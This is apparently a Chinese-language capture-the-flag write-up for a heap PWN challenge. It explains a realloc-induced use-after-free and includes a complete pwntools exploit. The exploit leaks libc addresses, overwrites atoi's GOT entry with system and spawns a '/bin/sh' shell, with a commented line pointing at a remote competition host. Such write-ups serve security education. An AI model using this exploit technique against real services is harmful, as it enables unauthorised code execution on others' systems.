# 全国大学生信息安全竞赛-PWN
### 序言
> 第一次在大赛中做出`PWN`题, 心情有点小激动.

### 程序运行
**0. 结构体**
```
struct node{
    char name[16];
    int price;
    int size;
    char* des;
}commodity[15];
```
**1.MENU**
```
1. add a commodity
2. del a commodity
3. list commodities
4. Change the price of a commodity
5. Change the description of a commodity
6. exit
```
**2. Add**
> `add` 一个 `commodity`, 输入`name, price, descrip_size`

**3. Del**
> 'del'一个`commodity`, 数组的指针会清零, `des`释放, `price`清零

**4. list**
> 列出所有内容,

**5. Change the price(没什么用)**
**6. Change the description of a commodity**
> &nbsp;&nbsp;&nbsp;&nbsp;漏洞在`realloc`, 当重新分配的`new_size < pre_size`, 返回原指针; `new_size > pre_size`释放原原指针, 重新分配内存. 但数组中的s指针并没有改成新分配的堆指针, 仍指向已释放的, 这点很重要. 此时又分配一个`node`, 恰好是这个已释放的堆, 那么上一个堆就可以编辑这个新分配的堆,　恐怖.
```c
char *realloc(ptr, newSize)
    char 	 *ptr;		/* Ptr to currently allocated block.  If
				 * it's 0, then this procedure behaves
				 * identically to malloc. */
    unsigned int newSize;	/* Size of block after it is extended */
{
    unsigned int curSize;
    char *newPtr;

    if (ptr == 0) {
	   return malloc(newSize);
    }
    curSize = Mem_Size(ptr);
    if (newSize <= curSize) {
	   return ptr;
    }
    newPtr = malloc(newSize);
    bcopy(ptr, newPtr, (int) curSize);
    free(ptr);
    return(newPtr);
}
```
### 过程
&nbsp;&nbsp;&nbsp;&nbsp;**思路**: 利用`realloc`函数产生的释放原指针, 程序没有更新指针. 实现修改`leak memory求得system真实地址`,`修改atoi的got表值为system`, 发送`/bin/sh\x00`.

**步骤一**
```python
new("bill", 100, 0x80, "A"*0x80) #　target
new("john", 200, 0x18, "A"*0x18) #
change_des("bill", 0xb0, "")     # 下面结果可以看见bill的原指针已被释放
'''
chunk      0x9dde000        0x20            (inuse)
chunk      0x9dde020        0x88            (F) FD 0xf76e5700 BK 0xf76e57b0
chunk      0x9dde0a8        0x20            (inuse)
chunk      0x9dde0c8        0x20            (inuse)
chunk      0x9dde0e8        0xb8            (inuse)
'''
new("merry", 200, 0x50, "A"*0x7) #　merry被分配到此处, bill可以编辑`merry的s`
```
**步骤二: leak memory**
```python
payload = "merry\x00" + "A"*(0x1c-6-4-4) + p32(0x50) + p32(atoi) + p16(0x59) # 泄露atoi的函数地址, 这也是为了确定远程的libc.so的版本, 然后使用libc-database找出其版本
change_des("bill", 0x80, payload)
list_all()
```
**步骤三: modify**
```
change_des("merry", 0x50, p32(system))　＃修改merry, 输入system, 相当于修改atoi的got值为system地址
```
**步骤四: get shell**
```
p.sendline("/bin/sh\x00")
```
### The Whole EXP
```python

from pwn import *

p = process("./task_supermarket")
#p = remote("117.78.43.123", 31420)
elf = ELF("./task_supermarket")
#libc = ELF("./libc.so.6")
libc = ELF("./libc.so") #本机的libc
context.log_level = 'debug'

def new(name, price, size, des):
    p.recvuntil("your choice>> ")
    p.sendline("1")
    p.recvuntil("name:")
    p.sendline(name)
    p.recvuntil("price:")
    p.sendline(str(price))
    p.recvuntil("descrip_size:")
    p.sendline(str(size))
    p.recvuntil("description:")
    p.sendline(des)

def delete(name):
    p.recvuntil("your choice>> ")
    p.send("2\n")
    p.recvuntil("name:")
    p.sendline(name)

def list_all():
    p.recvuntil("your choice>> ")
    p.send("3\n")

def change_price(name, price):
    p.recvuntil("your choice>> ")
    p.sendline("4")
    p.recvuntil("name:")
    p.sendline(name)
    p.recvuntil("or rise in:")
    p.sendline(str(price))

def change_des(name, size, des):
    p.recvuntil("your choice>> ")
    p.sendline("5")
    p.recvuntil("name:")
    p.sendline(name)
    p.recvuntil("descrip_size:")
    p.sendline(str(size))
    p.recvuntil("description:")
    p.sendline(des)

free_got = elf.got['free']
atoi = elf.got['atoi']
puts = elf.plt['puts']

gdb.attach(p)
new("bill", 100, 0x80, "A"*0x80)
new("john", 200, 0x18, "A"*0x18)
change_des("bill", 0xb0, "")
new("merry", 200, 0x50, "A"*0x7)

payload = "merry\x00" + "A"*(0x1c-6-4-4) + p32(0x50) + p32(atoi) + p16(0x59)
change_des("bill", 0x80, payload)
list_all()
p.recvuntil("merry: price.")
p.recv(16)
real_atoi = u32(p.recv(4))
system = real_atoi - (libc.symbols['atoi'] - libc.symbols['system'])

log.info("real_atoi: %s" % hex(real_atoi))
log.info("system: %s" % hex(system))
change_des("merry", 0x50, p32(system))

p.recvuntil("your choice>> ")
p.sendline("/bin/sh\x00")
p.interactive()
```
### Related Link
[相关文件](https://github.com/BBS-Bill-Gates/CTF/tree/master/2018/National/pwn/task)
